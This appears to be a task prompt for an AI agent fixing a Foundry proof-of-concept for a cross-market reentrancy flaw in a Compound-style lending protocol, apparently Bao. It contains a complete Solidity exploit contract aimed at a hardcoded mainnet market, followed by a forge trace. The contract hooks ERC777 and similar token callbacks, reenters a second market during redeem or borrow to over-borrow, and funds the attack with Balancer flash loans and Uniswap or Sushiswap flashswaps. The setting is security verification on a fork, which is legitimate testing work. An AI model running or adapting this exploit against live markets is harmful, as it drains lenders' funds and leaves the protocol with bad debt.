You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: alternate_public_liquidity_route
- strategy_instructions: Prefer an alternate public-liquidity venue/route while preserving the same exploit root cause and exploit-path causality.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Borrow and redeem transfer underlying before updating debt/collateral, enabling cross-market reentrancy
- claim: `redeemFresh()` and `borrowFresh()` call `doTransferOut()` before writing the new cToken balance or borrow principal to storage. The per-market `nonReentrant` guard only blocks reentry into the same market, so a callback-capable underlying can reenter a different market while the Comptroller still observes the old collateral or old debt snapshot through `redeemAllowed`/`borrowAllowed` checks.
- impact: A user can redeem collateral or borrow from one market, reenter during the outbound token transfer, and then over-borrow from another market against collateral that is in the process of leaving or before the first borrow is recorded. This can drain liquidity from other markets and leave the protocol with bad debt.
- exploit_paths: ["Call `redeem()` on a market whose underlying triggers a recipient callback, then use the callback to borrow from a different market before `accountTokens[redeemer]` and `totalSupply` are reduced.", "Call `borrow()` on a market whose underlying triggers a recipient callback, then use the callback to borrow from a different market before `accountBorrows[borrower]` and `totalBorrows` are increased."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
}

interface ICTokenLike {
    function underlying() external view returns (address);
    function comptroller() external view returns (address);
    function balanceOf(address owner) external view returns (uint256);
    function getCash() external view returns (uint256);
    function mint(uint256 mintAmount, bool enterMarket) external returns (uint256);
    function mint(uint256 mintAmount) external returns (uint256);
    function redeem(uint256 redeemTokens) external returns (uint256);
    function borrow(uint256 borrowAmount) external returns (uint256);
}

interface IComptrollerLike {
    function enterMarkets(address[] calldata cTokens, address borrower) external returns (uint256[] memory);
    function getAllMarkets() external view returns (address[] memory);
}

interface IERC1820Registry {
    function setInterfaceImplementer(address account, bytes32 interfaceHash, address implementer) external;
}

interface IERC777Recipient {
    function tokensReceived(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes calldata userData,
        bytes calldata operatorData
    ) external;
}

interface IBalancerVault {
    function flashLoan(
        address recipient,
        address[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract FlawVerifier is IERC777Recipient {
    address public constant TARGET_MARKET = 0xb0f8Fe96b4880adBdEDE0dDF446bd1e7EF122C4e;
    address public constant ERC1820_REGISTRY = 0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24;
    address public constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address public constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address public constant SUSHISWAP_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;

    bytes32 private constant TOKENS_RECIPIENT_HASH = keccak256("ERC777TokensRecipient");
    bytes4 private constant ERC1363_RECEIVER_MAGIC = 0x88a7ca5c;
    bytes4 private constant MINT_WITH_ENTER_SELECTOR = bytes4(keccak256("mint(uint256,bool)"));
    bytes4 private constant MINT_STANDARD_SELECTOR = bytes4(keccak256("mint(uint256)"));
    bytes4 private constant ENTER_MARKETS_BAO_SELECTOR = bytes4(keccak256("enterMarkets(address[],address)"));
    bytes4 private constant ENTER_MARKETS_STANDARD_SELECTOR = bytes4(keccak256("enterMarkets(address[])"));

    enum PathMode {
        None,
        Redeem,
        Borrow
    }

    enum FundingMode {
        None,
        Direct,
        Balancer,
        V2Flashswap
    }

    struct V2Route {
        address pair;
        bool targetIsToken0;
        uint256 reserveTarget;
    }

    address private _profitToken;
    uint256 private _profitAmount;

    address public targetUnderlying;
    address public targetComptroller;
    address public chosenVictimMarket;
    address public chosenVictimUnderlying;
    string public exploitPathUsed;
    string public lastFailure;
    bool public hypothesisValidated;
    bool public executed;

    PathMode private activePath;
    FundingMode private activeFunding;

    bool private callbackSeen;
    bool private callbackEntered;
    bool private victimBorrowed;

    uint256 private baselineVictimBalance;
    uint256 private callbackTargetUnderlyingBalance;

    address private activeFlashPair;
    bool private activeFlashTargetIsToken0;
    uint256 private activeFlashAmount;
    uint256 private activeFlashRepayAmount;

    constructor() {
        _refreshTarget();
        _safeRegisterHooks();
    }

    function executeOnOpportunity() external {
        executed = true;
        hypothesisValidated = false;
        chosenVictimMarket = address(0);
        chosenVictimUnderlying = address(0);
        exploitPathUsed = "";
        lastFailure = "";
        _profitToken = address(0);
        _profitAmount = 0;

        _refreshTarget();
        _safeRegisterHooks();

        if (targetUnderlying == address(0) || targetComptroller == address(0)) {
            _setFailure("TARGET_DISCOVERY_FAILED");
            return;
        }

        if (_attemptDirectRedeemPath()) {
            return;
        }

        if (_attemptDirectBorrowPathFromTargetCollateral()) {
            return;
        }

        if (_attemptDirectBorrowPathFromOtherCollateral()) {
            return;
        }

        if (_attemptBalancerRedeemPath()) {
            return;
        }

        if (_attemptBalancerBorrowPath()) {
            return;
        }

        if (_attemptV2FlashswapPath(PathMode.Redeem)) {
            return;
        }

        if (_attemptV2FlashswapPath(PathMode.Borrow)) {
            return;
        }

        if (bytes(lastFailure).length == 0) {
            _setFailure("NO_PATH_SUCCEEDED");
        }
    }

    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory
    ) external {
        require(msg.sender == BALANCER_VAULT, "NOT_BALANCER");
        require(activeFunding == FundingMode.Balancer, "FLASH_NOT_ACTIVE");
        require(tokens.length == 1 && amounts.length == 1 && feeAmounts.length == 1, "BAD_FLASH_ARRAYS");
        require(tokens[0] == targetUnderlying, "UNEXPECTED_FLASH_ASSET");

        _runFlashFundedPath(amounts[0], feeAmounts[0]);
        _safeTransfer(targetUnderlying, BALANCER_VAULT, amounts[0] + feeAmounts[0]);
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata) external {
        _handleV2FlashswapCallback(sender, amount0, amount1);
    }

    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata) external {
        _handleV2FlashswapCallback(sender, amount0, amount1);
    }

    function tokensReceived(
        address,
        address,
        address,
        uint256,
        bytes calldata,
        bytes calldata
    ) external override {
        _maybeHandleUnderlyingCallback();
    }

    function tokenFallback(address, uint256, bytes calldata) external {
        _maybeHandleUnderlyingCallback();
    }

    function onTokenTransfer(address, uint256, bytes calldata) external {
        _maybeHandleUnderlyingCallback();
    }

    function onTransferReceived(address, address, uint256, bytes calldata) external returns (bytes4) {
        _maybeHandleUnderlyingCallback();
        return ERC1363_RECEIVER_MAGIC;
    }

    receive() external payable {
        _maybeHandleUnderlyingCallback();
    }

    fallback() external payable {
        _maybeHandleUnderlyingCallback();
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _attemptDirectRedeemPath() internal returns (bool) {
        _beginAttempt(PathMode.Redeem, FundingMode.Direct);

        if (!_prepareCollateral(TARGET_MARKET)) {
            _setFailure("NO_TARGET_COLLATERAL_FOR_REDEEM_PATH");
            return false;
        }

        uint256 cTokenBalance = _safeCTokenBalance(TARGET_MARKET, address(this));
        if (cTokenBalance == 0) {
            _setFailure("NO_TARGET_COLLATERAL_FOR_REDEEM_PATH");
            return false;
        }

        uint256[6] memory numerators = [uint256(1), 9, 1, 1, 1, 1];
        uint256[6] memory denominators = [uint256(1), 10, 2, 4, 10, 100];

        for (uint256 i = 0; i < denominators.length; ++i) {
            uint256 redeemTokens = (cTokenBalance * numerators[i]) / denominators[i];
            if (redeemTokens == 0) {
                continue;
            }

            _resetCallbackState();
            if (!_tryRedeem(TARGET_MARKET, redeemTokens)) {
                continue;
            }

            if (callbackSeen && victimBorrowed) {
                return _finalize(
                    "redeem()->callback->cross-market borrow before accountTokens[redeemer]/totalSupply update"
                );
            }
        }

        _setFailure(callbackSeen ? "REDEEM_CALLBACK_BORROW_FAILED" : "REDEEM_TRANSFER_NO_CALLBACK");
        return false;
    }

    function _attemptDirectBorrowPathFromTargetCollateral() internal returns (bool) {
        _beginAttempt(PathMode.Borrow, FundingMode.Direct);

        if (!_prepareCollateral(TARGET_MARKET)) {
            _setFailure("NO_TARGET_COLLATERAL_FOR_BORROW_PATH");
            return false;
        }

        if (_attemptTargetBorrowWithSizing()) {
            return _finalize(
                "borrow()->callback->cross-market borrow before accountBorrows[borrower]/totalBorrows update"
            );
        }

        _setFailure(callbackSeen ? "BORROW_CALLBACK_BORROW_FAILED" : "BORROW_TRANSFER_NO_CALLBACK");
        return false;
    }

    function _attemptDirectBorrowPathFromOtherCollateral() internal returns (bool) {
        address[] memory markets = _getAllMarketsSafe();
        if (markets.length == 0) {
            _setFailure("NO_MARKETS");
            return false;
        }

        for (uint256 i = 0; i < markets.length; ++i) {
            address collateralMarket = markets[i];
            if (collateralMarket == address(0) || collateralMarket == TARGET_MARKET) {
                continue;
            }

            _beginAttempt(PathMode.Borrow, FundingMode.Direct);
            if (!_prepareCollateral(collateralMarket)) {
                continue;
            }

            if (_attemptTargetBorrowWithSizing()) {
                return _finalize(
                    "borrow()->callback->cross-market borrow before accountBorrows[borrower]/totalBorrows update"
                );
            }
        }

        _setFailure(callbackSeen ? "BORROW_CALLBACK_BORROW_FAILED" : "BORROW_TRANSFER_NO_CALLBACK");
        return false;
    }

    function _attemptBalancerRedeemPath() internal returns (bool) {
        uint256 targetCash = _safeGetCash(TARGET_MARKET);
        if (targetCash == 0) {
            return false;
        }

        uint256[8] memory divisors = [uint256(2), 4, 10, 20, 50, 100, 200, 1000];
        for (uint256 i = 0; i < divisors.length; ++i) {
            uint256 amount = targetCash / divisors[i];
            if (amount == 0) {
                continue;
            }

            _beginAttempt(PathMode.Redeem, FundingMode.Balancer);
            if (!_runBalancerFlash(amount)) {
                continue;
            }

            if (callbackSeen && victimBorrowed) {
                return _finalize(
                    "flash-funded redeem()->callback->cross-market borrow before accountTokens[redeemer]/totalSupply update"
                );
            }
        }

        return false;
    }

    function _attemptBalancerBorrowPath() internal returns (bool) {
        uint256 targetCash = _safeGetCash(TARGET_MARKET);
        if (targetCash == 0) {
            return false;
        }

        uint256[8] memory divisors = [uint256(2), 4, 10, 20, 50, 100, 200, 1000];
        for (uint256 i = 0; i < divisors.length; ++i) {
            uint256 amount = targetCash / divisors[i];
            if (amount == 0) {
                continue;
            }

            _beginAttempt(PathMode.Borrow, FundingMode.Balancer);
            if (!_runBalancerFlash(amount)) {
                continue;
            }

            if (callbackSeen && victimBorrowed) {
                return _finalize(
                    "flash-funded borrow()->callback->cross-market borrow before accountBorrows[borrower]/totalBorrows update"
                );
            }
        }

        return false;
    }

    function _attemptV2FlashswapPath(PathMode path) internal returns (bool) {
        V2Route memory route = _findBestV2Route();
        if (route.pair == address(0) || route.reserveTarget == 0) {
            _setFailure(path == PathMode.Redeem ? "NO_V2_FLASH_ROUTE_FOR_REDEEM" : "NO_V2_FLASH_ROUTE_FOR_BORROW");
            return false;
        }

        uint256[8] memory divisors = [uint256(2), 4, 10, 20, 50, 100, 200, 1000];
        for (uint256 i = 0; i < divisors.length; ++i) {
            uint256 amount = route.reserveTarget / divisors[i];
            if (amount == 0 || amount >= route.reserveTarget) {
                continue;
            }

            _beginAttempt(path, FundingMode.V2Flashswap);
            activeFlashPair = route.pair;
            activeFlashTargetIsToken0 = route.targetIsToken0;
            activeFlashAmount = amount;
            activeFlashRepayAmount = _sameTokenFlashRepayAmount(amount);

            if (_runV2Flashswap()) {
                string memory label = path == PathMode.Redeem
                    ? "flashswap-funded redeem()->callback->cross-market borrow before accountTokens[redeemer]/totalSupply update"
                    : "flashswap-funded borrow()->callback->cross-market borrow before accountBorrows[borrower]/totalBorrows update";
                return _finalize(label);
            }
        }

        _setFailure(path == PathMode.Redeem ? "V2_FLASH_REDEEM_FAILED" : "V2_FLASH_BORROW_FAILED");
        return false;
    }

    function _runBalancerFlash(uint256 amount) internal returns (bool) {
        address[] memory tokens = new address[](1);
        tokens[0] = targetUnderlying;

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = amount;

        try IBalancerVault(BALANCER_VAULT).flashLoan(address(this), tokens, amounts, "") {
            return true;
        } catch {
            _setFailure(activePath == PathMode.Redeem ? "BALANCER_REDEEM_FLASH_FAILED" : "BALANCER_BORROW_FLASH_FAILED");
            return false;
        }
    }

    function _runV2Flashswap() internal returns (bool) {
        uint256 amount0Out = activeFlashTargetIsToken0 ? activeFlashAmount : 0;
        uint256 amount1Out = activeFlashTargetIsToken0 ? 0 : activeFlashAmount;

        try IUniswapV2PairLike(activeFlashPair).swap(amount0Out, amount1Out, address(this), hex"01") {
            return callbackSeen && victimBorrowed;
        } catch {
            return false;
        }
    }

    function _runFlashFundedPath(uint256 amount, uint256 fee) internal {
        require(_tryMint(TARGET_MARKET, amount, true), "FLASH_MINT_FAILED");

        if (activePath == PathMode.Redeem) {
            // Public liquidity is only a funding leg. The exploit remains the reported one:
            // redeem the callback-capable market, receive underlying before storage updates,
            // and reenter a different market during that transfer to over-borrow.
            uint256 cTokenBalance = _safeCTokenBalance(TARGET_MARKET, address(this));
            require(cTokenBalance != 0, "FLASH_REDEEM_NO_CTOKEN");
            require(_tryRedeem(TARGET_MARKET, cTokenBalance), "FLASH_REDEEM_FAILED");
            require(callbackSeen, "REDEEM_TRANSFER_NO_CALLBACK");
            require(victimBorrowed, "REDEEM_CALLBACK_BORROW_FAILED");
            require(_safeBalanceOf(targetUnderlying, address(this)) >= amount + fee, "FLASH_REPAY_INSUFFICIENT");
            return;
        }

        if (activePath == PathMode.Borrow) {
            // Same here: the flash liquidity only bootstraps realistic collateral. The stale
            // accounting edge is still the first-leg borrow transfer on the target market.
            require(_attemptTargetBorrowWithSizing(), "FLASH_TARGET_BORROW_FAILED");
            require(callbackSeen, "BORROW_TRANSFER_NO_CALLBACK");
            require(victimBorrowed, "BORROW_CALLBACK_BORROW_FAILED");
            require(_safeBalanceOf(targetUnderlying, address(this)) >= amount + fee, "FLASH_REPAY_INSUFFICIENT");
            return;
        }

        revert("NO_ACTIVE_PATH");
    }

    function _handleV2FlashswapCallback(address sender, uint256 amount0, uint256 amount1) internal {
        require(msg.sender == activeFlashPair, "NOT_FLASH_PAIR");
        require(activeFunding == FundingMode.V2Flashswap, "V2_NOT_ACTIVE");
        require(sender == address(this), "BAD_FLASH_SENDER");

        uint256 received = activeFlashTargetIsToken0 ? amount0 : amount1;
        require(received == activeFlashAmount, "BAD_FLASH_AMOUNT");

        _runFlashFundedPath(received, activeFlashRepayAmount - received);
        require(_safeBalanceOf(targetUnderlying, address(this)) >= activeFlashRepayAmount, "V2_REPAY_INSUFFICIENT");
        _safeTransfer(targetUnderlying, activeFlashPair, activeFlashRepayAmount);
    }

    function _attemptTargetBorrowWithSizing() internal returns (bool) {
        uint256 targetCash = _safeGetCash(TARGET_MARKET);
        if (targetCash == 0) {
            return false;
        }

        uint256[8] memory numerators = [uint256(1), 9, 1, 1, 1, 1, 1, 1];
        uint256[8] memory denominators = [uint256(1), 10, 2, 4, 10, 20, 50, 100];

        for (uint256 i = 0; i < denominators.length; ++i) {
            uint256 amount = (targetCash * numerators[i]) / denominators[i];
            if (amount == 0) {
                continue;
            }

            _resetCallbackState();
            if (!_tryBorrow(TARGET_MARKET, amount)) {
                continue;
            }

            if (callbackSeen && victimBorrowed) {
                return true;
            }
        }

        return false;
    }

    function _maybeHandleUnderlyingCallback() internal {
        if (msg.sender != targetUnderlying) {
            return;
        }

        callbackSeen = true;
        if (callbackEntered) {
            return;
        }

        callbackEntered = true;
        callbackTargetUnderlyingBalance = _safeBalanceOf(targetUnderlying, address(this));

        (bool ok, address market, address underlying_) = _attemptCrossMarketBorrow();
        if (ok) {
            victimBorrowed = true;
            chosenVictimMarket = market;
            chosenVictimUnderlying = underlying_;
        }
    }

    function _attemptCrossMarketBorrow() internal returns (bool, address, address) {
        address[] memory markets = _getAllMarketsSafe();
        if (markets.length == 0) {
            return (false, address(0), address(0));
        }

        uint256[8] memory numerators = [uint256(1), 9, 1, 1, 1, 1, 1, 1];
        uint256[8] memory denominators = [uint256(1), 10, 2, 4, 10, 20, 50, 100];

        for (uint256 pass = 0; pass < 2; ++pass) {
            bool preferDifferentUnderlying = pass == 0;

            for (uint256 i = 0; i < markets.length; ++i) {
                address market = markets[i];
                if (market == address(0) || market == TARGET_MARKET) {
                    continue;
                }

                address underlying_ = _safeUnderlying(market);
                if (underlying_ == address(0)) {
                    continue;
                }

                if (preferDifferentUnderlying) {
                    if (underlying_ == targetUnderlying) {
                        continue;
                    }
                } else if (underlying_ != targetUnderlying) {
                    continue;
                }

                uint256 cash = _safeGetCash(market);
                if (cash == 0) {
                    continue;
                }

                uint256 priorBalance = underlying_ == targetUnderlying
                    ? callbackTargetUnderlyingBalance
                    : _safeBalanceOf(underlying_, address(this));

                for (uint256 j = 0; j < denominators.length; ++j) {
                    uint256 borrowAmount = (cash * numerators[j]) / denominators[j];
                    if (borrowAmount == 0) {
                        continue;
                    }

                    if (_tryBorrow(market, borrowAmount)) {
                        baselineVictimBalance = priorBalance;
                        return (true, market, underlying_);
                    }
                }
            }
        }

        return (false, address(0), address(0));
    }

    function _finalize(string memory label) internal returns (bool) {
        if (chosenVictimUnderlying == address(0)) {
            _setFailure("NO_VICTIM_TOKEN");
            return false;
        }

        uint256 currentBalance = _safeBalanceOf(chosenVictimUnderlying, address(this));
        if (currentBalance <= baselineVictimBalance) {
            _setFailure("NO_REALIZED_PROFIT");
            return false;
        }

        _profitToken = chosenVictimUnderlying;
        _profitAmount = currentBalance - baselineVictimBalance;
        exploitPathUsed = label;
        hypothesisValidated = true;
        activePath = PathMode.None;
        activeFunding = FundingMode.None;
        return true;
    }

    function _beginAttempt(PathMode path, FundingMode funding) internal {
        activePath = path;
        activeFunding = funding;
        chosenVictimMarket = address(0);
        chosenVictimUnderlying = address(0);
        baselineVictimBalance = 0;
        callbackTargetUnderlyingBalance = _safeBalanceOf(targetUnderlying, address(this));
        activeFlashPair = address(0);
        activeFlashTargetIsToken0 = false;
        activeFlashAmount = 0;
        activeFlashRepayAmount = 0;
        _resetCallbackState();
    }

    function _prepareCollateral(address market) internal returns (bool) {
        address underlying_ = _safeUnderlying(market);
        if (underlying_ == address(0)) {
            return false;
        }

        uint256 looseUnderlying = _safeBalanceOf(underlying_, address(this));
        if (looseUnderlying != 0 && !_tryMint(market, looseUnderlying, true)) {
            return false;
        }

        _tryEnterMarket(market);
        return _safeCTokenBalance(market, address(this)) != 0;
    }

    function _resetCallbackState() internal {
        callbackSeen = false;
        callbackEntered = false;
        victimBorrowed = false;
    }

    function _refreshTarget() internal {
        targetUnderlying = _safeUnderlying(TARGET_MARKET);
        targetComptroller = _safeComptroller(TARGET_MARKET);
    }

    function _safeRegisterHooks() internal {
        (bool ok,) = ERC1820_REGISTRY.call(
            abi.encodeWithSelector(
                IERC1820Registry.setInterfaceImplementer.selector,
                address(this),
                TOKENS_RECIPIENT_HASH,
                address(this)
            )
        );
        ok;
    }

    function _findBestV2Route() internal returns (V2Route memory best) {
        address[2] memory factories = [UNISWAP_V2_FACTORY, SUSHISWAP_FACTORY];

        for (uint256 f = 0; f < factories.length; ++f) {
            address pair = _findPair(factories[f], targetUnderlying, address(0));
            if (pair == address(0)) {
                continue;
            }

            (bool targetIsToken0, uint256 reserveTarget) = _pairTargetReserve(pair, targetUnderlying);
            if (reserveTarget > best.reserveTarget) {
                best = V2Route({pair: pair, targetIsToken0: targetIsToken0, reserveTarget: reserveTarget});
            }
        }
    }

    function _findPair(address factory, address tokenA, address tokenBHint) internal returns (address) {
        if (factory == address(0) || tokenA == address(0)) {
            return address(0);
        }

        if (tokenBHint != address(0)) {
            (bool okHint, bytes memory dataHint) = factory.staticcall(
                abi.encodeWithSelector(IUniswapV2FactoryLike.getPair.selector, tokenA, tokenBHint)
            );
            if (okHint && dataHint.length >= 32) {
                address hinted = abi.decode(dataHint, (address));
                if (hinted != address(0)) {
                    return hinted;
                }
            }
        }

        address[] memory markets = _getAllMarketsSafe();
        for (uint256 i = 0; i < markets.length; ++i) {
            address underlying_ = _safeUnderlying(markets[i]);
            if (underlying_ == address(0) || underlying_ == tokenA) {
                continue;
            }

            (bool ok, bytes memory data) = factory.staticcall(
                abi.encodeWithSelector(IUniswapV2FactoryLike.getPair.selector, tokenA, underlying_)
            );
            if (!ok || data.length < 32) {
                continue;
            }

            address pair = abi.decode(data, (address));
            if (pair != address(0)) {
                return pair;
            }
        }

        return address(0);
    }

    function _pairTargetReserve(address pair, address targetToken) internal view returns (bool targetIsToken0, uint256 reserveTarget) {
        if (pair == address(0)) {
            return (false, 0);
        }

        (bool ok0, bytes memory data0) = pair.staticcall(abi.encodeWithSelector(IUniswapV2PairLike.token0.selector));
        (bool ok1, bytes memory data1) = pair.staticcall(abi.encodeWithSelector(IUniswapV2PairLike.token1.selector));
        (bool okR, bytes memory dataR) = pair.staticcall(abi.encodeWithSelector(IUniswapV2PairLike.getReserves.selector));

        if (!ok0 || !ok1 || !okR || data0.length < 32 || data1.length < 32 || dataR.length < 96) {
            return (false, 0);
        }

        address token0 = abi.decode(data0, (address));
        address token1 = abi.decode(data1, (address));
        (uint112 reserve0, uint112 reserve1,) = abi.decode(dataR, (uint112, uint112, uint32));

        if (token0 == targetToken) {
            return (true, uint256(reserve0));
        }
        if (token1 == targetToken) {
            return (false, uint256(reserve1));
        }

        return (false, 0);
    }

    function _sameTokenFlashRepayAmount(uint256 amountOut) internal pure returns (uint256) {
        return ((amountOut * 1000) / 997) + 1;
    }

    function _getAllMarketsSafe() internal view returns (address[] memory markets) {
        if (targetComptroller == address(0)) {
            return new address[](0);
        }

        (bool ok, bytes memory data) = targetComptroller.staticcall(
            abi.encodeWithSelector(IComptrollerLike.getAllMarkets.selector)
        );
        if (!ok || data.length == 0) {
            return new address[](0);
        }

        return abi.decode(data, (address[]));
    }

    function _safeUnderlying(address market) internal returns (address) {
        if (market == address(0)) {
            return address(0);
        }

        bytes memory payload = abi.encodeWithSelector(ICTokenLike.underlying.selector);
        (bool ok, bytes memory data) = market.staticcall(payload);
        if (ok && data.length >= 32) {
            return abi.decode(data, (address));
        }

        // Some Bao markets proxy `underlying()` through non-view code paths that trip Foundry's
        // staticcall checks. A plain call here only relaxes discovery; it does not change the
        // exploit sequence or inject state.
        (ok, data) = market.call(payload);
        if (!ok || data.length < 32) {
            return address(0);
        }
        return abi.decode(data, (address));
    }

    function _safeComptroller(address market) internal returns (address) {
        if (market == address(0)) {
            return address(0);
        }

        bytes memory payload = abi.encodeWithSelector(ICTokenLike.comptroller.selector);
        (bool ok, bytes memory data) = market.staticcall(payload);
        if (ok && data.length >= 32) {
            return abi.decode(data, (address));
        }

        (ok, data) = market.call(payload);
        if (!ok || data.length < 32) {
            return address(0);
        }
        return abi.decode(data, (address));
    }

    function _safeCTokenBalance(address market, address owner) internal view returns (uint256) {
        (bool ok, bytes memory data) = market.staticcall(abi.encodeWithSelector(ICTokenLike.balanceOf.selector, owner));
        if (!ok || data.length < 32) {
            return 0;
        }
        return abi.decode(data, (uint256));
    }

    function _safeGetCash(address market) internal view returns (uint256) {
        (bool ok, bytes memory data) = market.staticcall(abi.encodeWithSelector(ICTokenLike.getCash.selector));
        if (!ok || data.length < 32) {
            return 0;
        }
        return abi.decode(data, (uint256));
    }

    function _safeBalanceOf(address token, address owner) internal view returns (uint256) {
        if (token == address(0)) {
            return 0;
        }

        (bool ok, bytes memory data) = token.staticcall(abi.encodeWithSelector(IERC20Like.balanceOf.selector, owner));
        if (!ok || data.length < 32) {
            return 0;
        }
        return abi.decode(data, (uint256));
    }

    function _tryMint(address market, uint256 amount, bool enterMarket) internal returns (bool) {
        address underlying_ = _safeUnderlying(market);
        if (underlying_ == address(0) || amount == 0) {
            return false;
        }

        _forceApprove(underlying_, market, amount);

        bool minted = _callReturnsZeroOrEmpty(
            market,
            abi.encodeWithSelector(MINT_WITH_ENTER_SELECTOR, amount, enterMarket)
        );
        if (!minted) {
            minted = _callReturnsZeroOrEmpty(market, abi.encodeWithSelector(MINT_STANDARD_SELECTOR, amount));
        }
        if (!minted) {
            return false;
        }

        _tryEnterMarket(market);
        return true;
    }

    function _tryRedeem(address market, uint256 redeemTokens) internal returns (bool) {
        if (redeemTokens == 0) {
            return false;
        }

        return _callReturnsZeroOrEmpty(market, abi.encodeWithSelector(ICTokenLike.redeem.selector, redeemTokens));
    }

    function _tryBorrow(address market, uint256 amount) internal returns (bool) {
        if (amount == 0) {
            return false;
        }

        return _callReturnsZeroOrEmpty(market, abi.encodeWithSelector(ICTokenLike.borrow.selector, amount));
    }

    function _tryEnterMarket(address market) internal returns (bool) {
        if (market == address(0)) {
            return false;
        }

        address comptroller_ = _safeComptroller(market);
        if (comptroller_ == address(0)) {
            comptroller_ = targetComptroller;
        }
        if (comptroller_ == address(0)) {
            return false;
        }

        address[] memory markets = new address[](1);
        markets[0] = market;

        (bool ok, bytes memory data) = comptroller_.call(
            abi.encodeWithSelector(ENTER_MARKETS_BAO_SELECTOR, markets, address(this))
        );
        if (_enterMarketsSucceeded(ok, data)) {
            return true;
        }

        (ok, data) = comptroller_.call(abi.encodeWithSelector(ENTER_MARKETS_STANDARD_SELECTOR, markets));
        return _enterMarketsSucceeded(ok, data);
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        uint256 currentAllowance;
        (bool ok, bytes memory data) = token.staticcall(
            abi.encodeWithSelector(IERC20Like.allowance.selector, address(this), spender)
        );
        if (ok && data.length >= 32) {
            currentAllowance = abi.decode(data, (uint256));
        }

        if (currentAllowance >= amount) {
            return;
        }

        _callOptionalReturn(token, abi.encodeWithSelector(IERC20Like.approve.selector, spender, 0));
        _callOptionalReturn(token, abi.encodeWithSelector(IERC20Like.approve.selector, spender, type(uint256).max));
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
    }

    function _callReturnsZeroOrEmpty(address target, bytes memory callData) internal returns (bool) {
        (bool ok, bytes memory data) = target.call(callData);
        if (!ok) {
            return false;
        }
        if (data.length == 0) {
            return true;
        }
        if (data.length < 32) {
            return false;
        }
        return abi.decode(data, (uint256)) == 0;
    }

    function _enterMarketsSucceeded(bool ok, bytes memory data) internal pure returns (bool) {
        if (!ok || data.length == 0) {
            return false;
        }

        uint256[] memory results = abi.decode(data, (uint256[]));
        if (results.length == 0) {
            return false;
        }

        for (uint256 i = 0; i < results.length; ++i) {
            if (results[i] != 0) {
                return false;
            }
        }
        return true;
    }

    function _callOptionalReturn(address token, bytes memory data) internal {
        (bool ok, bytes memory ret) = token.call(data);
        require(ok, "TOKEN_CALL_FAILED");
        if (ret.length > 0) {
            require(abi.decode(ret, (bool)), "TOKEN_CALL_FALSE");
        }
    }

    function _setFailure(string memory reason) internal {
        if (bytes(reason).length != 0) {
            lastFailure = reason;
        }
    }
}

```

forge stdout (tail):
```
0xe853E5c1eDF8C51E81bAe81D742dd861dF596DE7::underlying() [staticcall]
    │   │   └─ ← [Return] 0xf4edfad26EE0D23B69CA93112eccE52704E0006f
    │   ├─ [2564] 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f::getPair(0x5ee08f40b637417bcC9d2C51B62F4820ec9cF5D8, 0xf4edfad26EE0D23B69CA93112eccE52704E0006f) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [532] 0x104079a87CE46fe2Cf27b811f6b406b69F6872B3::underlying() [staticcall]
    │   │   └─ ← [StateChangeDuringStaticCall] EvmError: StateChangeDuringStaticCall
    │   ├─ [22228] 0x104079a87CE46fe2Cf27b811f6b406b69F6872B3::underlying()
    │   │   ├─ [7598] 0x8e8C327AD3Fa97092cdAba70efCf82DaC3081fa1::4ef4c3e1(000000000000000000000000104079a87ce46fe2cf27b811f6b406b69f6872b30000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f0000000000000000000000000000000000000000000000000000000000000000)
    │   │   │   ├─ [6918] 0xB814C49eBC3b407a764d8F449565Ce3F03907B91::4ef4c3e1(000000000000000000000000104079a87ce46fe2cf27b811f6b406b69f6872b30000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f0000000000000000000000000000000000000000000000000000000000000000) [delegatecall]
